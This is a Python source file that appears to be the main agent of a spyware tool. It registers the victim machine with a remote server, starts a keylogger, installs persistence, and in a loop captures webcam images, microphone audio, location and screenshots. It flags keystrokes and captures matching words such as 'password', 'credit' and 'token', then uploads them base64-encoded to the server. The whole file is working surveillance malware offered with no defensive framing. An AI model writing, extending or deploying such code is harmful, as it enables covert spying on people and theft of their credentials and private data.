import json
import time
import os
import sys
import requests
import base64
import platform
import socket
import uuid
from datetime import datetime
import threading
import logging

from capture import Capture
from keylogger import Keylogger
from ai_analysis import analyze_data
from persistence import install_persistence

# --- Configuration ---
CONFIG_FILE = 'config.json'
try:
    with open(CONFIG_FILE) as f:
        config = json.load(f)
except:
    config = {
        "server_url": "http://127.0.0.1:5000",
        "capture_interval": 120,
        "enable_camera": True,
        "enable_mic": True,
        "enable_location": True,
        "enable_screenshot": False,
        "enable_keylogger": True,
        "ai_confidence_threshold": 0.6,
        "keywords": ["password", "login", "credit", "secret", "token", "key"]
    }

SERVER_URL = config.get('server_url', 'http://127.0.0.1:5000')

# --- Setup ---
logging.basicConfig(filename='spy.log', level=logging.INFO,
                    format='%(asctime)s %(message)s')

# Generate unique agent ID
hostname = socket.gethostname()
agent_id = hostname + '-' + str(uuid.uuid4())[:8]

# Register with server
def register():
    info = {
        'hostname': hostname,
        'os': platform.system(),
        'user': os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USER', 'unknown'),
        'arch': platform.machine()
    }
    try:
        r = requests.post(f"{SERVER_URL}/api/register", json={'id': agent_id, 'info': info}, timeout=10)
        return r.status_code == 200
    except:
        return False

# Send log
def send_log(log_type, data):
    try:
        requests.post(f"{SERVER_URL}/api/log", json={
            'agent_id': agent_id,
            'type': log_type,
            'data': data[:1000]  # truncate
        }, timeout=10)
    except:
        pass

# Send media (image/audio)
def send_media(media_type, data_bytes):
    try:
        b64 = base64.b64encode(data_bytes).decode('utf-8')
        requests.post(f"{SERVER_URL}/api/media", json={
            'agent_id': agent_id,
            'type': media_type,
            'data': b64
        }, timeout=10)
    except:
        pass

# --- Main loop ---
def main_loop():
    # Register
    if not register():
        logging.error("Registration failed")
        return

    # Start keylogger
    keylogger = None
    if config.get('enable_keylogger', True):
        keylogger = Keylogger()
        keylogger.start()
        logging.info("Keylogger started")

    # Install persistence (once)
    install_persistence()

    capture = Capture()
    while True:
        try:
            data = {}
            if config.get('enable_camera', True):
                img = capture.camera()
                if img is not None:
                    data['image'] = img
            if config.get('enable_location', True):
                loc = capture.location()
                if loc:
                    data['location'] = loc
            if config.get('enable_mic', True):
                audio = capture.microphone(duration=3)
                if audio:
                    data['audio'] = audio
            if config.get('enable_screenshot', False):
                scr = capture.screenshot()
                if scr:
                    data['screenshot'] = scr

            # Get keylogs
            if keylogger:
                logs = keylogger.get_logs()
                if logs:
                    data['keylog'] = logs

            # Analyze
            analysis, interesting, reason = analyze_data(data, config)

            if interesting or data.get('keylog'):
                # Send log summary
                msg = f"Alert at {time.ctime()}\n"
                if analysis.get('label'):
                    msg += f"Object: {analysis['label']}\n"
                if analysis.get('ocr'):
                    msg += f"OCR: {analysis['ocr'][:100]}\n"
                if analysis.get('location'):
                    msg += f"Location: {analysis['location'][:100]}\n"
                if data.get('keylog'):
                    msg += f"Keys: {data['keylog'][:100]}\n"
                send_log('alert', msg)

                # Send image if available
                if data.get('image') is not None:
                    import cv2
                    _, buf = cv2.imencode('.jpg', data['image'])
                    send_media('image', buf.tobytes())

                # Send audio if available
                if data.get('audio'):
                    send_media('audio', data['audio'])

            # Flush keylogger logs to file
            if keylogger:
                keylogger.flush()

        except Exception as e:
            logging.error(f"Main loop error: {e}")

        time.sleep(config.get('capture_interval', 120))

if __name__ == '__main__':
    main_loop()